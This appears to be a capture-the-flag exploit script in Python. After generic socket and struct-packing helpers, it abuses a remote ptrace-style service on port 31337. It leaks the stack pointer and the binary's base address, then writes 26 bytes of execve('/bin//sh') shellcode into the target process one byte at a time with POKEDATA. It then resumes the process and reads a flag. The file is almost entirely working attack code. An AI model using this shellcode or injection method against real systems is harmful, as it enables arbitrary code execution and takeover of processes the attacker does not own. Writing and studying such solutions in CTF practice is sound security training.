#!/usr/bin/env python3

import struct
import socket
import select
import sys
import time
import binascii
import os
import math
import re
import hashlib
import telnetlib
import base64
import random
import string
import itertools
import ctypes
import traceback

try:
    ctypes.cdll.LoadLibrary("libc.so.6")
    libc = ctypes.CDLL("libc.so.6")
except:
    pass

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

class brute(object):
    def __init__(self, chars, n):
        self.chars = chars
        self.n = n
        self.state = [0 for i in range(n)]
        self.atend = False
    
    def __iter__(self):
        return self
    
    def next(self):
        if self.atend:
            raise StopIteration()
        res = [self.chars[self.state[i]] for i in range(self.n)]
        for i in range(self.n):
            self.state[i] += 1;
            if self.state[i] == len(self.chars):
                self.state[i] = 0
            else:
                return ''.join(res)
        self.atend = True
        return ''.join(res)

def demo_brute(vals, n, check_func):
    for v in itertools.product(vals, repeat=n):
        if check_func(v):
            return ''.join(v)

def demo_perms(vals, check_func):
    for v in itertools.permutations(vals):
        if check_func(v):
            return ''.join(v)

def rnd_string(sz, alpha=alphanum):
    res = ''
    for i in range(sz):
        res += alpha[random.randrange(0, len(alpha))]
    return res

def c_srand(seed):
    libc.srand(seed)

def c_rand():
    return libc.rand()

def c_time(t):
    return libc.time(t)

def p(f, *args):
    return struct.pack(f, *args).decode("latin1")

p32 = lambda x: p("<I", x)
p64 = lambda x: p("<Q", x)
enc = lambda x: x.encode("latin1")
dec = lambda x: x.decode("latin1")

def u(f, v):
    if type(v) == str:
        v = enc(v)
    return struct.unpack(f, v)

u32 = lambda x: u("<I", x.ljust(4, '\x00')[:4])[0]
u64 = lambda x: u("<Q", x.ljust(8, '\x00')[:8])[0]

def hx(s):
    if type(s) == str:
        s = enc(s)
    return binascii.hexlify(s)
   
def ux(s):
    return binascii.unhexlify(s)

def read_until(s, content, echo = True):
    if type(content) == str:
        content = [content]
    x = ""
    while True:
        y = s.recv(1)
        if not y:
            return False
        x += dec(y)
        for v in content:
            if x.endswith(v):
                if echo:
                    sys.stderr.write(x)
                return x

def ru(s, txt):
    return read_until(s, [txt])

def rl(s):
    return ru(s, '\n')

def send_after(s, txt, data):
    ru(s, txt)
    if type(data) == str:
        data = enc(data)
    print('> ', data)
    s.send(data)

sa = lambda x,y,z: send_after(x, y, z)

def interact(s):
    t = telnetlib.Telnet()                                                            
    t.sock = s                                                                        
    t.interact() 

def _interact(s):
    done = False
    while not done:
        rlist, wlist, elist = select.select([sys.stdin, s], [], [])
        for r in rlist:
            if r == sys.stdin:
                b = sys.stdin.readline()
                if b is None or len(b) == 0:
                    done = True
                    break
                b = b.rstrip() + '\n'
                s.send(enc(b))
            else:
                b = s.recv(1)
                if b is None or len(b) == 0:
                    done = True
                    break
                else:
                    sys.stdout.write(dec(b))
                    sys.stdout.flush()

def make_chain(rop, is64 = True):
    if is64:
        return p("<%dQ" % len(rop), *rop)
    else:
        return p("<%dI" % len(rop), *rop)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

target = (HOST, PORT)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

shellcode = \
   "\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f" + \
   "\x50\x54\x5a\x57\x54\x5e\xb0\x3b\x0f\x05"
# total size: 26 bytes

PTRACE_PEEKTEXT  = 1
PTRACE_PEEKDATA  = 2
PTRACE_PEEKUSR   = 3
PTRACE_POKETEXT  = 4
PTRACE_POKEDATA  = 5
PTRACE_POKEUSR   = 6
PTRACE_GETREGS   = 12
PTRACE_SETREGS   = 13

rsp = 19 * 8

AT_PHDR = 3

def ptrace(s, cmd, addr, data):
    read_until(s, "send?\n")
    p = ("%x\n" % cmd).encode("latin1")
    s.send(p)
    read_until(s, "want?\n")
    p = ("%x\n" % addr).encode("latin1")
    s.send(p)
    read_until(s, "data?\n")
    p = ("%x\n" % data).encode("latin1")
    s.send(p)
    read_until(s, "returned ")
    val = int(read_until(s, "\n").strip(), 16)
    return val    

write_addr = 0x13B3

rsp = ptrace(s, PTRACE_PEEKUSR, rsp, 0)
print("0x%x" % rsp)

while True:
    send_after(s, "?\n", "1\n")
    v = ptrace(s, PTRACE_PEEKDATA, rsp, 0)
    rsp += 8
    if v == 3:
        break

send_after(s, "?\n", "1\n")
v = ptrace(s, PTRACE_PEEKDATA, rsp, 0)
base = v & ~0xfff

print("BASE: 0x%x" % base)

write_addr += base

for b in shellcode:
    send_after(s, "?\n", "1\n")
    v = ptrace(s, PTRACE_POKEDATA, write_addr, ord(b))
    write_addr += 1    

send_after(s, "?\n", "1\n")
ptrace(s, 7, 0, 0)

time.sleep(1)
send_after(s, "?\n", "0\n")

s.send('./submitter\n'.encode())

flag = read_until(s, '}')
print(flag)

s.close()
